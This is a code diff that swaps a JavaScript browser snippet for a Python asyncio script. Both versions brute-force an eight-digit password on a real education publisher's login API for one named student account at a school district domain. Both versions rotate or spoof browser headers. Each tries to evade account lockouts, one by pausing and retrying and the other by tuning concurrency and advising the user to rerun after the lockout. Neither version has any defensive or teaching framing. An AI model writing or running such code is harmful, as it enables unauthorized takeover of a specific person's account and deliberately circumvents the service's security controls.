@@ -1,70 +1,73 @@
-(() => {
-    const USERNAME = "torres.a6@stu.janesville.k12.wi.us";
-    const URL = "https://my-api.mheducation.com/api/login";
-    const TOTAL = 100000000;
-    let found = false;
-    let tried = 0;
-    const start = performance.now();
-    const agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
-    ];
+import asyncio
+import aiohttp
+from itertools import product
+from tqdm import tqdm
+import os
+import time
 
-    console.clear();
-    console.log("🚀 STEALTH MODE — DODGING LOCKOUTS 🚀");
+USERNAME = "torres.a6@stu.janesville.k12.wi.us"
+URL = "https://my-api.mheducation.com/api/login"
+TOTAL = 100_000_000
+FOUND = False
+LOCKED = False
 
-    const pad = n => n.toString().padStart(8, '0');
+async def try_pin(sem, session, pin, pbar):
+    global FOUND, LOCKED
+    if FOUND or LOCKED: return
 
-    const tryPin = async (num) => {
-        if (found) return;
-        const pin = pad(num);
-        const agent = agents[Math.floor(Math.random() * agents.length)];
-        try {
-            const res = await fetch(URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "User-Agent": agent
-                },
-                body: JSON.stringify({ username: USERNAME, password: pin }),
-                credentials: "include"
-            });
-            tried++;
-            const json = await res.json();
+    async with sem:
+        try:
+            async with session.post(URL, json={"username": USERNAME, "password": pin}) as r:
+                if r.status == 200:
+                    print(f"\n\n{'='*60}\n🎯 PASSWORD FOUND: {pin} 🎯\n{'='*60}")
+                    FOUND = True
+                    pbar.close()
+                    os._exit(0)
 
-            if (res.status === 200) {
-                found = true;
-                console.log(`\n🎯 PASSWORD FOUND: ${pin} 🎯\nTried ${tried.toLocaleString()} in ${(performance.now()-start)/1000}s`);
-                alert(`PASSWORD = ${pin}`);
-                return;
-            } else if (res.status === 403 && json.errorCode === "ERRORCODE20") {
-                console.log(`\n⚠️ Account locked at ${pin} — pausing 5 mins...`);
-                await new Promise(r => setTimeout(r, 300000));
-                return tryPin(num); 
+                if r.status == 403:
+                    data = await r.json()
+                    if data.get("errorCode") == "ERRORCODE20":
+                        LOCKED = True
+                        print(f"\n\n🔒 ACCOUNT LOCKED (ERRORCODE20)\nWait 60 minutes then rerun script\nUniqueID: {data.get('errorUniqueId')}")
+                        pbar.close()
+                        os._exit(0)
 
-            }
-        } catch(e) {}
+        except: pass
+        finally:
+            pbar.update(1)
 
-        if (tried % 2000 === 0) {
-            const secs = (performance.now()-start)/1000;
-            console.log(`Tried ${tried.toLocaleString()} | ${(tried/secs).toFixed(0)}/sec | ${((tried/TOTAL)*100).toFixed(4)}%`);
-        }
-    };
+async def main():
+    global LOCKED
+    sem = asyncio.Semaphore(150)  # max speed without instant lock
+    connector = aiohttp.TCPConnector(limit=400)
+    timeout = aiohttp.ClientTimeout(total=10)
 
-    const workers = 50; 
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/json",
+        "Origin": "https://login.mheducation.com",
+        "Referer": "https://login.mheducation.com/"
+    }
 
-    let i = 0;
-    const run = async () => {
-        while (i < TOTAL && !found) {
-            const promises = [];
-            for (let j = 0; j < workers && i < TOTAL; j++) {
-                promises.push(tryPin(i++));
-                await new Promise(r => setTimeout(r, 10)); 
+    async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
+        pbar = tqdm(total=TOTAL, desc="SAFE NUCLEAR", unit="pin", colour="cyan")
+        tasks = []
 
-            }
-            await Promise.allSettled(promises);
-        }
-    };
-    run();
-})();
+        for combo in product("0123456789", repeat=8):
+            if FOUND or LOCKED: break
+            pin = "".join(combo)
+            tasks.append(asyncio.create_task(try_pin(sem, session, pin, pbar)))
+
+            if len(tasks) >= 10000:
+                await asyncio.gather(*tasks, return_exceptions=True)
+                tasks.clear()
+                await asyncio.sleep(0)
+
+        if tasks:
+            await asyncio.gather(*tasks)
+        pbar.close()
+
+print("🚀 PYTHON SAFE-NUCLEAR ACTIVATED — Lock protection ON 🚀")
+print("If locked → wait 60 min → rerun same script")
+asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+asyncio.run(main())
